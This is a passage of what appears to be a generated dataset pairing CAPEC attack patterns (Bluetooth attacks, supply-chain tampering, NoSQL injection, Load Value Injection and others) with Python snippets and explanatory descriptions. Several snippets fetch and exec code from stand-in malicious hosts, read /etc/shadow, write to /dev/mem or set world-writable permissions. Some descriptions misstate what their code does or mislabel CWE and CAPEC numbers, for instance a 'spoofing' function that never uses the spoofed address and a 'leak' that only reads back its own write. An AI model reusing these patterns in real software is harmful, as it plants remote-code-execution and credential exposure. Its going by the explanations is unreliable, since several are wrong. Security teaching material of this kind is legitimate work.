        "description": "This Python code snippet simulates the exploitation of Thunderbolt protection flaws by manipulating the firmware of a Thunderbolt controller. The code demonstrates several vulnerabilities: \n1. CWE-1188: The use of an insecure default authentication key.\n2. CWE-345 and CWE-353: Lack of data authenticity verification and integrity checks.\n3. CWE-862: Missing authorization checks.\n4. CWE-288: Authentication bypass using an insecure default key.\n\nThe `manipulate_firmware` function simulates the process of writing manipulated firmware data to an SPI flash device and bypassing authentication using an insecure default key. If authentication is bypassed, it proceeds to extract data from the SPI flash, demonstrating potential data extraction and memory modification attacks."
    },
    {
        "capec_id": "666",
        "capec_name": "BlueSmacking",
        "code_snippet": "import bluetooth\n\n# Vulnerable Bluetooth server that can be flooded\nserver_sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)\nserver_sock.bind((\"\", 0x1001))\nserver_sock.listen(1)\n\nprint(\"Waiting for connection...\")\nclient_sock, address = server_sock.accept()\nprint(f\"Accepted connection from {address}\")\n\ntry:\n    while True:\n        data = client_sock.recv(1024)  # CWE-404: Improper Resource Shutdown or Release\n        if not data:\n            break\n        print(f\"Received: {data}\")\nfinally:\n    client_sock.close()\n    server_sock.close()  # CWE-404: Improper Resource Shutdown or Release\n",
        "description": "This Python code snippet demonstrates a vulnerable Bluetooth server that listens for incoming L2CAP connections. The server accepts a connection and continuously receives data from the client. The vulnerability lies in the fact that the server can be flooded with large packets, leading to a Denial of Service (DoS) attack, which is the main idea of the BlueSmacking CAPEC. Additionally, the code does not properly handle resource shutdown or release (CWE-404), which can exacerbate the DoS condition by exhausting system resources. The code also does not implement any form of message integrity checks (CWE-924), making it susceptible to data tampering during transmission."
    },
    {
        "capec_id": "667",
        "capec_name": "Bluetooth Impersonation AttackS (BIAS)",
        "code_snippet": "import bluetooth\n\ndef spoof_bluetooth_device(target_mac, spoofed_mac):\n    # Create a Bluetooth socket\n    sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)\n    \n    try:\n        # Connect to the target device using the spoofed MAC address\n        sock.connect((target_mac, 1))\n        \n        # Send a malicious payload\n        sock.send('malicious_payload')\n        \n        print(f'Successfully spoofed {target_mac} using {spoofed_mac}')\n    except bluetooth.btcommon.BluetoothError as err:\n        print(f'Failed to connect: {err}')\n    finally:\n        sock.close()\n\n# Example usage\nspoof_bluetooth_device('00:11:22:33:44:55', '66:77:88:99:AA:BB')",
        "description": "This Python code snippet demonstrates a Bluetooth Impersonation Attack (BIAS) by spoofing the MAC address of a Bluetooth device. The function `spoof_bluetooth_device` takes a target MAC address and a spoofed MAC address as inputs. It creates a Bluetooth socket and attempts to connect to the target device using the spoofed MAC address. If the connection is successful, it sends a malicious payload to the target device. This code embodies the main idea of CAPEC-290 (Authentication Bypass by Spoofing) and CAPEC-940 (Improper Verification of Source of a Communication Channel) by exploiting weak authentication mechanisms and improper verification of the source of communication."
    },
    {
        "capec_id": "668",
        "capec_name": "Key Negotiation of Bluetooth Attack (KNOB)",
        "code_snippet": "import random\n\nclass BluetoothConnection:\n    def __init__(self):\n        self.entropy_bits = 16  # Default entropy bits\n        self.key = self.generate_key(self.entropy_bits)\n\n    def generate_key(self, entropy_bits):\n        return ''.join(random.choice('0123456789ABCDEF') for _ in range(entropy_bits // 4))\n\n    def negotiate_key(self, attacker_present=False):\n        if attacker_present:\n            # Attacker forces the entropy bits to a lower value\n            self.entropy_bits = 1  # Vulnerable to attack\n        self.key = self.generate_key(self.entropy_bits)\n        return self.key\n\n# Simulate a Bluetooth connection with an attacker in the middle\nbluetooth_connection = BluetoothConnection()\nprint('Original Key:', bluetooth_connection.key)\n\n# Attacker modifies the key negotiation process\nattacker_present = True\nnegotiated_key = bluetooth_connection.negotiate_key(attacker_present)\nprint('Negotiated Key with Attacker:', negotiated_key)",
        "description": "This Python code snippet simulates a Bluetooth key negotiation process that is vulnerable to the Key Negotiation of Bluetooth Attack (KNOB). The `BluetoothConnection` class initializes with a default number of entropy bits (16) and generates a key based on these bits. The `negotiate_key` method allows for an attacker to be present, which forces the entropy bits to a lower value (1), making the key easily guessable. This represents the main idea of the CAPEC, where an attacker can manipulate the key negotiation process to reduce security. The related CWEs are reflected in the lack of proper protection mechanisms (CWE-693) and the selection of a less secure algorithm (CWE-757)."
    },
    {
        "capec_id": "669",
        "capec_name": "Alteration of a Software Update",
        "code_snippet": "import requests\n\n# CWE-807: Reliance on Untrusted Inputs in a Security Decision\n# CWE-506: Embedded Malicious Code\n# CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\n\n# Simulate downloading a software update from an untrusted source\nupdate_url = 'http://untrusted-source.com/software_update'\nresponse = requests.get(update_url)\n\nif response.status_code == 200:\n    # CWE-506: Embedded Malicious Code\n    # Malicious code embedded in the update\n    exec(response.text)\nelse:\n    print('Failed to download the update')\n\n# CWE-1277 and CWE-1329: Firmware Not Updateable and Reliance on Component That is Not Updateable\n# Simulate a component that cannot be updated\nclass NonUpdateableComponent:\n    def __init__(self):\n        self.version = '1.0'\n\n    def perform_action(self):\n        print('Performing action with version', self.version)\n\ncomponent = NonUpdateableComponent()\ncomponent.perform_action()",
        "description": "This Python code snippet demonstrates the main idea of CAPEC-235: 'Alteration of a Software Update'. The code simulates downloading a software update from an untrusted source (CWE-807) and executing it, which could potentially contain embedded malicious code (CWE-506). Additionally, it includes a class representing a non-updateable component (CWE-1277 and CWE-1329), highlighting the risk of relying on components that cannot be patched or updated. The code also touches on the exposure of a version-control repository to unauthorized control (CWE-527) by implying that the update source is untrusted."
    },
    {
        "capec_id": "670",
        "capec_name": "Software Development Tools Maliciously Altered",
        "code_snippet": "import os\n\n# CWE-506: Embedded Malicious Code\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# CWE-913: Improper Control of Dynamically-Managed Code Resources\n\n# Malicious function that exposes sensitive information\ndef malicious_function():\n    sensitive_info = os.getenv('SECRET_KEY')  # Assume SECRET_KEY is a sensitive environment variable\n    if sensitive_info:\n        # CWE-497: Exposing sensitive information\n        print(f'Sensitive Information: {sensitive_info}')\n\n# CWE-733: Compiler Optimization Removal or Modification of Security-critical Code\n# CWE-1037: Processor Optimization Removal or Modification of Security-critical Code\n# Security-critical function that might be optimized away\ndef security_critical_function():\n    security_check = True\n    if security_check:\n        print('Security check passed')\n    else:\n        print('Security check failed')\n\n# Main function that simulates the deployment of the software\nif __name__ == '__main__':\n    # Simulate the malicious alteration of the development tool\n    malicious_function()\n    # Simulate the execution of security-critical code\n    security_critical_function()",
        "description": "This Python code snippet demonstrates the concept of 'Software Development Tools Maliciously Altered' by embedding malicious code within a development environment. The `malicious_function` exposes sensitive information (CWE-506 and CWE-497) by printing an environment variable that is assumed to be sensitive. The `security_critical_function` represents a security mechanism that could be optimized away by the compiler or processor (CWE-733 and CWE-1037), potentially compromising the security of the software. The main function simulates the deployment of the software, executing both the malicious and security-critical functions, illustrating the potential impact of maliciously altered development tools."
    },
    {
        "capec_id": "671",
        "capec_name": "Requirements for ASIC Functionality Maliciously Altered",
        "code_snippet": "class ASIC:\n    def __init__(self, security_token):\n        self.security_token = security_token\n        self.confidential_data = 'Sensitive Information'\n        self.security_identifier = 'SECURE_ID'\n\n    def access_confidential_data(self, token):\n        if token == self.security_token:\n            return self.confidential_data\n        else:\n            return 'Access Denied'\n\n    def modify_security_token(self, new_token):\n        self.security_token = new_token\n\n# Malicious alteration of requirements\n# Original security token is 'SECURE_TOKEN'\nasic = ASIC('SECURE_TOKEN')\n\n# Adversary modifies the security token requirement\nasic.modify_security_token('MALICIOUS_TOKEN')\n\n# Attempt to access confidential data with the new token\nprint(asic.access_confidential_data('MALICIOUS_TOKEN'))  # Outputs: Sensitive Information\n",
        "description": "This Python code snippet represents the main idea of the CAPEC 'Requirements for ASIC Functionality Maliciously Altered'. The ASIC class simulates an application-specific integrated circuit with a security token mechanism to control access to confidential data. The adversary maliciously alters the security token requirement by changing the token from 'SECURE_TOKEN' to 'MALICIOUS_TOKEN'. This alteration allows unauthorized access to the confidential data, demonstrating vulnerabilities related to CWE-1259 (Improper Restriction of Security Token Assignment) and CWE-1270 (Generation of Incorrect Security Tokens). The code highlights how improper handling of security tokens can lead to unauthorized access and potential exploitation."
    },
    {
        "capec_id": "672",
        "capec_name": "Malicious Code Implanted During Chip Programming",
        "code_snippet": "class ChipFirmware:\n    def __init__(self):\n        self.registers = [0] * 10  # Simulated memory-mapped I/O registers\n        self.security_token = 'valid_token'\n\n    def program_chip(self, code):\n        # Malicious code injection during programming\n        self.firmware_code = code + '\\nself.remote_control()'\n\n    def remote_control(self):\n        # Malicious function to control the host system\n        print('Remote control activated')\n\n    def execute(self):\n        exec(self.firmware_code)\n\n    def access_register(self, index, token):\n        # Improper access control to registers\n        if token == self.security_token:\n            return self.registers[index]\n        else:\n            raise PermissionError('Invalid security token')\n\n# Example usage\nchip = ChipFirmware()\nmalicious_code = 'print(\"Executing legitimate code\")'\nchip.program_chip(malicious_code)\nchip.execute()",
        "description": "This Python code snippet simulates the concept of 'Malicious Code Implanted During Chip Programming' (CAPEC). The `ChipFirmware` class represents the firmware of a chip with memory-mapped I/O registers and a security token mechanism. The `program_chip` method demonstrates how an adversary can inject malicious code during the programming step. The `remote_control` method represents the malicious functionality that can be triggered later. The `access_register` method shows improper access control to the registers, which is related to CWE-1262. The example usage demonstrates how the malicious code is injected and executed, embodying the main idea of the CAPEC."
    },
    {
        "capec_id": "673",
        "capec_name": "Developer Signing Maliciously Altered Software",
        "code_snippet": "import requests\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://example.com/malicious_code.py'\nresponse = requests.get(url)\n\n# CWE-506: Embedded Malicious Code\n# CWE-507: Trojan Horse\nif response.status_code == 200:\n    exec(response.text)  # Executing downloaded code without verification\n\n# CWE-215: Insertion of Sensitive Information Into Debugging Code\nDEBUG = True\nif DEBUG:\n    print('Debug Info: User credentials are user:password')\n\n# CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\nimport os\nos.system('git clone http://example.com/repo.git')  # Cloning a potentially exposed repository",
        "description": "This Python code snippet demonstrates a scenario where a developer inadvertently signs and deploys maliciously altered software. The code downloads and executes a script from a remote location without verifying its integrity (CWE-494), potentially embedding malicious code (CWE-506) and acting as a Trojan Horse (CWE-507). Additionally, it includes sensitive information in debugging output (CWE-215) and clones a version-control repository from an unauthorized source (CWE-527). This represents the CAPEC scenario where a developer unknowingly signs and distributes compromised software."
    },
    {
        "capec_id": "674",
        "capec_name": "Design for FPGA Maliciously Altered",
        "code_snippet": "import random\n\nclass FPGA:\n    def __init__(self):\n        self.configuration = self.load_configuration()\n\n    def load_configuration(self):\n        # Simulate loading a configuration that could be maliciously altered\n        config = {'function': 'normal_operation'}\n        if random.choice([True, False]):\n            config['function'] = 'malicious_operation'  # CWE-506: Embedded Malicious Code\n        return config\n\n    def execute(self):\n        if self.configuration['function'] == 'malicious_operation':\n            self.malicious_function()\n        else:\n            self.normal_function()\n\n    def normal_function(self):\n        print(\"Executing normal operation.\")\n\n    def malicious_function(self):\n        print(\"Executing malicious operation!\")  # CWE-1037, CWE-733: Security-critical code altered\n\n# Simulate FPGA reload\nfpga = FPGA()\nfpga.execute()",
        "description": "This Python code snippet simulates the concept of an FPGA being maliciously altered, as described in the CAPEC. The FPGA class has a method to load its configuration, which can randomly be set to a 'malicious_operation' to represent the introduction of malicious functionality (CWE-506). The execute method checks the configuration and runs either a normal or malicious function, demonstrating how security-critical code can be altered or removed (CWE-1037, CWE-733). This example highlights the vulnerability of FPGA configurations to malicious alterations, which can lead to compromised system operations."
    },
    {
        "capec_id": "675",
        "capec_name": "Retrieve Data from Decommissioned Devices",
        "code_snippet": "import os\n\nclass Device:\n    def __init__(self, data):\n        self.data = data  # Sensitive data stored in cleartext\n\n    def decommission(self):\n        # Improper scrubbing of sensitive data\n        self.data = None  # Insufficient data removal\n\n    def save_to_disk(self, filename):\n        with open(filename, 'w') as file:\n            file.write(self.data)  # Cleartext storage of sensitive information\n\n# Simulate device usage\ndevice = Device('Sensitive Information')\ndevice.save_to_disk('device_data.txt')\ndevice.decommission()\n\n# Simulate adversary retrieving data from decommissioned device\nwith open('device_data.txt', 'r') as file:\n    retrieved_data = file.read()\n    print(f'Retrieved Data: {retrieved_data}')",
        "description": "This Python code snippet demonstrates a scenario where sensitive information is improperly handled during the decommissioning of a device. The `Device` class stores sensitive data in cleartext and provides a `decommission` method that attempts to remove the data but does so insufficiently. The `save_to_disk` method stores the sensitive data in cleartext on disk. After decommissioning, an adversary can easily retrieve the sensitive data from the disk, illustrating the vulnerabilities described in the CAPEC and related CWEs. This code highlights issues such as improper scrubbing of sensitive data, insufficient data removal, and cleartext storage of sensitive information."
    },
    {
        "capec_id": "676",
        "capec_name": "NoSQL Injection",
        "code_snippet": "from flask import Flask, request\nimport pymongo\n\napp = Flask(__name__)\nclient = pymongo.MongoClient('mongodb://localhost:27017/')\ndb = client['testdb']\ncollection = db['users']\n\n@app.route('/login', methods=['POST'])\ndef login():\n    username = request.form['username']\n    password = request.form['password']\n    query = {'username': username, 'password': password}\n    user = collection.find_one(query)\n    if user:\n        return 'Login successful!'\n    else:\n        return 'Invalid credentials!'\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a NoSQL injection vulnerability in a simple Flask web application. The application connects to a MongoDB database and provides a login endpoint. The login function constructs a query using user-supplied input (username and password) without proper validation or neutralization of special elements. This allows an attacker to manipulate the query and potentially bypass authentication. For example, an attacker could input a specially crafted username and password to alter the query logic and gain unauthorized access."
    },
    {
        "capec_id": "677",
        "capec_name": "Server Motherboard Compromise",
        "code_snippet": "import os\nimport mmap\n\n# Simulate malicious code insertion in flash memory\nclass MaliciousFirmware:\n    def __init__(self, firmware_path):\n        self.firmware_path = firmware_path\n\n    def inject_malware(self):\n        with open(self.firmware_path, 'r+b') as f:\n            mm = mmap.mmap(f.fileno(), 0)\n            # CWE-506: Embedded Malicious Code\n            mm.write(b'\\x90\\x90\\x90\\x90')  # NOP sled as a placeholder for malicious code\n            mm.close()\n\n    def access_sensitive_info(self):\n        # CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n        sensitive_info = os.popen('cat /etc/shadow').read()\n        print(sensitive_info)\n\n    def improper_register_access(self):\n        # CWE-1262: Improper Access Control for Register Interface\n        with open('/dev/mem', 'r+b') as f:\n            mm = mmap.mmap(f.fileno(), 0)\n            mm.seek(0x1000)  # Arbitrary register address\n            mm.write(b'\\x01')  # Improperly modifying register\n            mm.close()\n\n# Example usage\nfirmware = MaliciousFirmware('/path/to/firmware.bin')\nfirmware.inject_malware()\nfirmware.access_sensitive_info()\nfirmware.improper_register_access()",
        "description": "This Python code snippet simulates the insertion of malicious code into a server's firmware, representing a 'Server Motherboard Compromise' as described in the CAPEC. The `MaliciousFirmware` class includes methods to inject malware into the firmware (CWE-506), access sensitive system information (CWE-497), and improperly access hardware registers (CWE-1262). The `inject_malware` method writes a NOP sled to the firmware file, simulating the insertion of malicious code. The `access_sensitive_info` method reads and prints sensitive information from the system, and the `improper_register_access` method demonstrates improper access to memory-mapped I/O registers. This code highlights the potential vulnerabilities and malicious activities that can occur when a server motherboard is compromised."
    },
    {
        "capec_id": "678",
        "capec_name": "System Build Data Maliciously Altered",
        "code_snippet": "import os\nimport tempfile\n\n# CWE-377: Insecure Temporary File\n# CWE-426: Untrusted Search Path\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# CWE-209: Generation of Error Message Containing Sensitive Information\n# CWE-913: Improper Control of Dynamically-Managed Code Resources\n\ndef build_system(config_path):\n    try:\n        # Read configuration file (potentially maliciously altered)\n        with open(config_path, 'r') as config_file:\n            config_data = config_file.read()\n\n        # Use a temporary file insecurely\n        temp_file = tempfile.NamedTemporaryFile(delete=False)\n        temp_file.write(config_data.encode())\n        temp_file.close()\n\n        # Execute a command using an untrusted search path\n        os.system(f'/usr/local/bin/build_tool --config {temp_file.name}')\n\n    except Exception as e:\n        # Generate an error message containing sensitive information\n        print(f'Error during build: {str(e)}')\n\n# Example usage\nbuild_system('/path/to/config')",
        "description": "This Python code snippet demonstrates a system build process that is vulnerable to several security weaknesses. The `build_system` function reads a configuration file, which could be maliciously altered (CAPEC-153). It then writes the configuration data to a temporary file insecurely (CWE-377). The build tool is executed using an untrusted search path (CWE-426), which could lead to the execution of malicious code. If an error occurs, the function generates an error message that may contain sensitive information (CWE-209). Additionally, the code does not properly control dynamically-managed code resources (CWE-913), as it directly reads from and writes to files without proper validation or sanitization."
    },
    {
        "capec_id": "679",
        "capec_name": "Exploitation of Improperly Configured or Implemented Memory Protections",
        "code_snippet": "import ctypes\n\n# Simulate a memory region with ctypes\nclass MemoryRegion(ctypes.Structure):\n    _fields_ = [\n        ('data', ctypes.c_char * 1024)\n    ]\n\n# Create a memory region instance\nmemory = MemoryRegion()\n\n# Simulate improper access control by allowing direct write access\n# This represents CWE-1282: Assumed-Immutable Data is Stored in Writable Memory\nmemory.data[0:4] = b'BOOT'\n\n# Simulate a function that should be protected but is not\n# This represents CWE-1252: CPU Hardware Not Configured to Support Exclusivity of Write and Execute Operations\ndef vulnerable_function():\n    exec(memory.data[0:4])\n\n# Simulate an attacker modifying the memory region\n# This represents CWE-1274: Improper Access Control for Volatile Memory Containing Boot Code\nmemory.data[0:4] = b'EVIL'\n\n# Execute the vulnerable function\nvulnerable_function()",
        "description": "This Python code snippet simulates a memory region using the ctypes library and demonstrates improper access control and memory protection vulnerabilities. The memory region is directly writable, representing CWE-1282, where assumed-immutable data is stored in writable memory. The `vulnerable_function` simulates a function that executes code from this memory region, representing CWE-1252, where the CPU is not configured to support exclusivity of write and execute operations. An attacker can modify the memory region, as shown by changing the content from 'BOOT' to 'EVIL', representing CWE-1274, where volatile memory containing boot code lacks sufficient access control. This code embodies the main idea of CAPEC by showing how missing or incorrectly configured memory protections can be exploited to inject and execute malicious code."
    },
    {
        "capec_id": "680",
        "capec_name": "Exploitation of Improperly Controlled Registers",
        "code_snippet": "class HardwareRegister:\n    def __init__(self):\n        self.registers = {'config': 0x0, 'lock': 0x0}\n\n    def write_register(self, name, value):\n        if name == 'lock' and self.registers['lock'] == 0x1:\n            print('Error: Register is locked!')\n            return\n        self.registers[name] = value\n        print(f'Register {name} set to {value}')\n\n    def read_register(self, name):\n        return self.registers.get(name, 'Register not found')\n\n# Example usage\nhw_reg = HardwareRegister()\n\n# Attempt to write to the config register\nhw_reg.write_register('config', 0x1234)\n\n# Lock the registers\nhw_reg.write_register('lock', 0x1)\n\n# Attempt to modify the config register after locking\nhw_reg.write_register('config', 0x5678)\n\n# Read the config register\nprint(hw_reg.read_register('config'))",
        "description": "This Python code snippet simulates a hardware register interface with basic access control mechanisms. The `HardwareRegister` class contains a dictionary of registers, including a 'config' register and a 'lock' register. The `write_register` method allows writing to a register unless the 'lock' register is set to 0x1, which simulates a lock bit mechanism. If the 'lock' register is set, any attempt to modify other registers is denied, demonstrating the concept of preventing unauthorized modifications. This code embodies the main idea of CAPEC by showing how improper access control and lock bit mechanisms can be exploited if not correctly implemented, as described in the related CWEs."
    },
    {
        "capec_id": "681",
        "capec_name": "Exploitation of Improperly Controlled Hardware Security Identifiers",
        "code_snippet": "class SoC:\n    def __init__(self):\n        self.security_tokens = {}\n\n    def assign_token(self, entity, token):\n        # CWE-1259: Improper Restriction of Security Token Assignment\n        self.security_tokens[entity] = token\n\n    def check_access(self, entity, action):\n        # CWE-1270: Generation of Incorrect Security Tokens\n        token = self.security_tokens.get(entity, None)\n        if token is None:\n            return False\n        # CWE-1294: Insecure Security Identifier Mechanism\n        if token != 'valid_token':\n            return False\n        return True\n\n    def perform_action(self, entity, action):\n        if self.check_access(entity, action):\n            print(f\"Action {action} performed by {entity}\")\n        else:\n            print(f\"Access denied for {entity} to perform {action}\")\n\n# Example usage\nsoc = SoC()\nsoc.assign_token('entity1', 'invalid_token')  # CWE-1270: Incorrect token generation\nsoc.perform_action('entity1', 'read_data')  # Access should be denied due to invalid token\n\nsoc.assign_token('entity2', 'valid_token')\nsoc.perform_action('entity2', 'write_data')  # Action should be allowed",
        "description": "This Python code snippet represents a simplified System-on-Chip (SoC) security mechanism that uses security tokens to control access to actions. The `SoC` class has methods to assign tokens to entities and check access based on these tokens. The code demonstrates several vulnerabilities: CWE-1259 (Improper Restriction of Security Token Assignment) by allowing any token to be assigned without validation, CWE-1270 (Generation of Incorrect Security Tokens) by assigning an invalid token, and CWE-1294 (Insecure Security Identifier Mechanism) by not securely verifying the token. The `perform_action` method checks if an entity has the correct token before allowing an action, but due to the mentioned weaknesses, the system can be exploited if tokens are not properly managed."
    },
    {
        "capec_id": "682",
        "capec_name": "Exploitation of Firmware or ROM Code with Unpatchable Vulnerabilities",
        "code_snippet": "class Device:\n    def __init__(self, firmware_version, rom_code):\n        self.firmware_version = firmware_version\n        self.rom_code = rom_code\n        self.updateable = False  # CWE-1277: Firmware Not Updateable\n        self.rom_patchable = False  # CWE-1310: Missing Ability to Patch ROM Code\n\n    def check_for_updates(self):\n        if not self.updateable:\n            print(\"Firmware cannot be updated.\")\n        else:\n            print(\"Checking for firmware updates...\")\n\n    def patch_rom(self):\n        if not self.rom_patchable:\n            print(\"ROM code cannot be patched.\")\n        else:\n            print(\"Patching ROM code...\")\n\n# Example usage\nmy_device = Device(firmware_version=\"1.0\", rom_code=\"ABC123\")\nmy_device.check_for_updates()\nmy_device.patch_rom()",
        "description": "This Python code snippet defines a `Device` class that simulates a device with unpatchable firmware and ROM code, embodying the main idea of the CAPEC. The `Device` class has attributes `firmware_version` and `rom_code`, and flags `updateable` and `rom_patchable` to indicate whether the firmware and ROM code can be updated or patched, respectively. The `check_for_updates` and `patch_rom` methods print messages indicating the inability to update the firmware or patch the ROM code, reflecting CWE-1277 and CWE-1310. This code represents a device that is vulnerable due to its unpatchable nature, aligning with the CAPEC description."
    },
    {
        "capec_id": "690",
        "capec_name": "Metadata Spoofing",
        "code_snippet": "import requests\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://example.com/malicious_script.py'\nresponse = requests.get(url)\n\n# CWE-348: Use of Less Trusted Source\nif response.status_code == 200:\n    with open('downloaded_script.py', 'w') as file:\n        file.write(response.text)\n\n# CWE-290: Authentication Bypass by Spoofing\n# CWE-1230: Exposure of Sensitive Information Through Metadata\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n# Simulating metadata spoofing by altering file metadata\nimport os\nos.system('touch -t 202301010000 downloaded_script.py')  # Change file timestamp\nos.system('chmod 755 downloaded_script.py')  # Change file permissions\n\n# Execute the downloaded script without verifying its integrity\nexec(open('downloaded_script.py').read())",
        "description": "This Python code snippet demonstrates a scenario where metadata spoofing can occur. The code downloads a script from a potentially malicious URL without performing any integrity checks (CWE-494). It then saves the script to a local file, assuming the source is trusted (CWE-348). The code further simulates metadata spoofing by altering the file's timestamp and permissions, making it appear legitimate (CWE-290, CWE-1230, CWE-941). Finally, the script is executed without verifying its integrity, which could lead to the execution of malicious code. This example highlights the risks associated with metadata spoofing and the importance of verifying the integrity and authenticity of downloaded resources."
    },
    {
        "capec_id": "691",
        "capec_name": "Spoof Open-Source Software Metadata",
        "code_snippet": "import requests\nimport hashlib\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://example.com/malicious_package.tar.gz'\nresponse = requests.get(url)\n\n# CWE-348: Use of Less Trusted Source\nif response.status_code == 200:\n    with open('malicious_package.tar.gz', 'wb') as file:\n        file.write(response.content)\n\n# CWE-506: Embedded Malicious Code\nimport tarfile\nwith tarfile.open('malicious_package.tar.gz', 'r:gz') as tar:\n    tar.extractall(path='./malicious_package')\n\n# CWE-1395: Dependency on Vulnerable Third-Party Component\nimport subprocess\nsubprocess.run(['pip', 'install', './malicious_package'])\n\n# CWE-290: Authentication Bypass by Spoofing\n# Assuming the package contains a script that bypasses authentication\nimport malicious_package.auth_bypass as auth_bypass\n\n# Execute the malicious function\nauth_bypass.execute()",
        "description": "This Python code snippet demonstrates a scenario where an adversary spoofs open-source software metadata to distribute malicious software. The code downloads a package from an untrusted source (CWE-494), saves it without verifying its integrity (CWE-348), and extracts it (CWE-506). It then installs the package, which may contain a vulnerable third-party component (CWE-1395). Finally, it imports and executes a function that bypasses authentication (CWE-290). This represents the CAPEC idea of masquerading malicious software as trusted open-source software."
    },
    {
        "capec_id": "692",
        "capec_name": "Spoof Version Control System Commit Metadata",
        "code_snippet": "import os\nimport subprocess\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://malicious.example.com/repo.git'\nsubprocess.run(['git', 'clone', url, 'repo'])\n\n# CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\nos.system('chmod -R 777 repo')\n\n# CWE-348: Use of Less Trusted Source\ntrusted_url = 'http://trusted.example.com/repo.git'\nsubprocess.run(['git', 'remote', 'set-url', 'origin', trusted_url], cwd='repo')\n\n# CWE-540: Inclusion of Sensitive Information in Source Code\nwith open('repo/config.py', 'w') as f:\n    f.write(\"API_KEY = 'sensitive_information'\")\n\n# Spoofing commit metadata\nos.system('cd repo && git commit --allow-empty -m \"Fake commit from trusted source\" --author=\"Trusted Author <trusted@example.com>\"')",
        "description": "This Python code snippet demonstrates a scenario where an adversary spoofs metadata in a Version Control System (VCS) repository to deceive users. The code clones a repository from a potentially malicious source without verifying its integrity (CWE-494). It then sets permissions that expose the repository to unauthorized access (CWE-527). The repository's remote URL is changed to a less trusted source (CWE-348), and sensitive information is included in the source code (CWE-540). Finally, a fake commit is made with spoofed metadata to make it appear as if it came from a trusted author, embodying the main idea of the CAPEC."
    },
    {
        "capec_id": "693",
        "capec_name": "StarJacking",
        "code_snippet": "import requests\nimport subprocess\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://example.com/malicious_package.tar.gz'\nresponse = requests.get(url)\n\n# CWE-506: Embedded Malicious Code\nwith open('malicious_package.tar.gz', 'wb') as file:\n    file.write(response.content)\n\n# CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\nsubprocess.run(['tar', '-xzf', 'malicious_package.tar.gz'])\n\n# CWE-348: Use of Less Trusted Source\n# CWE-1395: Dependency on Vulnerable Third-Party Component\nsubprocess.run(['python', 'setup.py', 'install'])",
        "description": "This Python code snippet demonstrates a scenario where an adversary can exploit the 'StarJacking' attack pattern. The code downloads a package from a potentially malicious URL without verifying its integrity (CWE-494). The downloaded package may contain embedded malicious code (CWE-506). The code then extracts the package, potentially exposing a version-control repository to unauthorized access (CWE-527). Finally, it installs the package using a less trusted source (CWE-348) and may depend on a vulnerable third-party component (CWE-1395). This snippet highlights the risks associated with downloading and executing code from untrusted sources without proper verification."
    },
    {
        "capec_id": "694",
        "capec_name": "System Location Discovery",
        "code_snippet": "import os\nimport time\nimport locale\n\n# Function to gather system location information\ndef gather_system_info():\n    info = {}\n    info['timezone'] = time.tzname\n    info['locale'] = locale.getdefaultlocale()\n    info['keyboard_layout'] = os.popen('setxkbmap -query | grep layout').read().strip()\n    return info\n\n# Function to simulate exposure of sensitive system information\ndef expose_system_info():\n    system_info = gather_system_info()\n    # Simulate exposure by printing the information\n    print('Exposing system information:')\n    for key, value in system_info.items():\n        print(f'{key}: {value}')\n\n# Main execution\nif __name__ == '__main__':\n    expose_system_info()",
        "description": "This Python code snippet demonstrates the concept of 'System Location Discovery' by gathering and exposing sensitive system information such as timezone, locale, and keyboard layout. The `gather_system_info` function collects this information using standard libraries and system commands. The `expose_system_info` function simulates the exposure of this information by printing it to the console. This code embodies the CAPEC idea by showing how an adversary might collect and expose system location information, potentially aiding in further attacks. The related CWEs are represented by the improper handling and exposure of sensitive system information."
    },
    {
        "capec_id": "695",
        "capec_name": "Repo Jacking",
        "code_snippet": "import requests\nimport subprocess\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'https://example.com/malicious_script.py'\nresponse = requests.get(url)\n\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\nexec(response.text)\n\n# CWE-426: Untrusted Search Path\nsubprocess.run(['python', 'malicious_script.py'])",
        "description": "This Python code snippet demonstrates a scenario where an adversary can exploit the 'Repo Jacking' vulnerability. The code downloads a Python script from a remote URL without verifying its integrity (CWE-494). It then executes the downloaded script directly (CWE-829), which could include malicious functionality. Additionally, it uses an untrusted search path to run the script (CWE-426). This represents the main idea of 'Repo Jacking', where an attacker can trick users into incorporating malicious code into their applications by exploiting the redirect property of VCS repositories."
    },
    {
        "capec_id": "696",
        "capec_name": "Load Value Injection",
        "code_snippet": "import ctypes\nimport mmap\nimport os\nimport struct\n\n# Allocate a memory page\npage_size = mmap.PAGESIZE\nfd = os.open('/dev/zero', os.O_RDWR)\nmem = mmap.mmap(fd, page_size, mmap.MAP_PRIVATE, mmap.PROT_READ | mmap.PROT_WRITE)\nos.close(fd)\n\n# Induce a page fault by accessing an invalid memory address\ntry:\n    invalid_address = ctypes.c_void_p(0xdeadbeef)\n    ctypes.string_at(invalid_address, 1)\nexcept ValueError:\n    pass\n\n# Simulate transient execution by accessing data in microarchitectural buffers\n# This is a simplified representation and does not perform actual transient execution\nbuffer = struct.pack('Q', 0x4141414141414141)  # Adversary-controlled data\nmem.write(buffer)\n\n# Read the data back, simulating a side-channel analysis\nmem.seek(0)\nleaked_data = struct.unpack('Q', mem.read(8))[0]\nprint(f'Leaked data: {hex(leaked_data)}')\n\nmem.close()",
        "description": "This Python code snippet demonstrates a simplified version of Load Value Injection (LVI) by inducing a page fault and simulating transient execution. The code allocates a memory page, induces a page fault by accessing an invalid memory address, and then writes adversary-controlled data to the memory. It then reads the data back, simulating a side-channel analysis to leak sensitive information. This example embodies the main idea of exploiting hardware design flaws in CPU implementations to manipulate transient execution and extract sensitive data from microarchitectural buffers."
    },
    {
        "capec_id": "697",
        "capec_name": "DHCP Spoofing",
